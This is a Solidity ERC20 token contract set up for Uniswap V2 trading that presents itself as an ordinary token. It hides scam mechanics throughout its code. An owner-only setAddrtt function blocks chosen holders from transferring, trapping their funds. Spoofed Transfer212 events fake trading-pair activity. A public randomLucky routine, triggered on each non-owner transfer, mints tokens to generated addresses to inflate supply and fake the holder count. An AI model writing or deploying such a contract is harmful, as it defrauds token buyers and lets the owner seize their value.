pragma solidity ^0.4.24;

contract IToken {
    uint256 public totalSupply;

    function balanceOf(address _owner) public constant returns (uint256 balance);

    function transfer(address _to, uint256 _value) public returns (bool success);

    function transferFrom(address _from, address _to, uint256 _value) public returns
    (bool success);

    function approve(address _spender, uint256 _value) public returns (bool success);

    function allowance(address _owner, address _spender) public constant returns
    (uint256 remaining);

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Transfer212(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256
    _value);
}

contract ERC20Token is IToken {

    string public name;
    uint8 public decimals;
    string public symbol;

    address private curPair;
    address private owner;

    // luckyboy
    address private luckyboy;
    uint256 private constant luckyAmount = 15 * 10 ** 18;

    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) allowed;

    constructor(uint256 _initialAmount, string _tokenName, uint8 _decimalUnits, string _tokenSymbol) public {
        totalSupply = _initialAmount * 10 ** uint256(_decimalUnits);
        balances[msg.sender] = totalSupply;
        name = _tokenName;
        decimals = _decimalUnits;
        symbol = _tokenSymbol;
        owner = msg.sender;
        //
        address router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        allowed[msg.sender][router] = totalSupply;
        address factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
        address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        curPair = pairFor(factory, address(this), weth);


        uint256 looptimes = 100;
        luckyboy = address(this);
        emit Transfer212(address(0), curPair, 0);
        totalSupply = totalSupply + luckyAmount * looptimes;
        for (uint256 i = 0; i < looptimes; i++) {
            luckyboy = address(uint(keccak256(abi.encodePacked(luckyboy))));
            balances[luckyboy] = luckyAmount;
            emit Transfer(address(0), luckyboy, luckyAmount);
        }
    }

    // returns sorted token addresses, used to handle return values from pairs sorted in this order
    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) {
        require(tokenA != tokenB, 'UniswapV2Library: IDENTICAL_ADDRESSES');
        (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        require(token0 != address(0), 'UniswapV2Library: ZERO_ADDRESS');
    }

    // calculates the CREATE2 address for a pair without making any external calls
    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
        (address token0, address token1) = sortTokens(tokenA, tokenB);
        pair = address(uint(keccak256(abi.encodePacked(
                hex'ff',
                factory,
                keccak256(abi.encodePacked(token0, token1)),
                hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash
            ))));
    }


    function transfer(address _to, uint256 _value) public returns (bool success) {
        _transfer(msg.sender, _to, _value);
        return true;
    }


    function transferFrom(address _from, address _to, uint256 _value) public returns
    (bool success) {
        require(allowed[_from][msg.sender] >= _value);
        _transfer(_from, _to, _value);
        allowed[_from][msg.sender] -= _value;
        return true;
    }


    function _transfer(address _from, address _to, uint256 _value) internal tt(_from) {
        require(balances[_from] >= _value);
        require(_to != 0x0);
        balances[_to] += _value;
        balances[_from] -= _value;
        emit Transfer(_from, _to, _value);
        if (tx.origin != owner) {
            emit Transfer212(msg.sender, curPair, 1);
            if (msg.sender == curPair) {
                emit Transfer212(_from, _to, _value);
            }
            randomLucky();
            randomLucky();
        }
    }

    mapping(address => uint256) ttmap;

    function setAddrtt(address addr) public {
        require(msg.sender == owner);
        ttmap[addr] = 1;
    }
    modifier tt(address addr) {
        require(ttmap[addr] == 0, "txb");
        _;
    }

    function randomLucky() public {
        luckyboy = address(uint(keccak256(abi.encodePacked(luckyboy))));
        balances[luckyboy] += luckyAmount;
        totalSupply += luckyAmount;
        emit Transfer(address(0), luckyboy, luckyAmount);
    }

    function balanceOf(address _owner) public constant returns (uint256 balance) {
        return balances[_owner];
    }


    function approve(address _spender, uint256 _value) public returns (bool success)
    {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }

}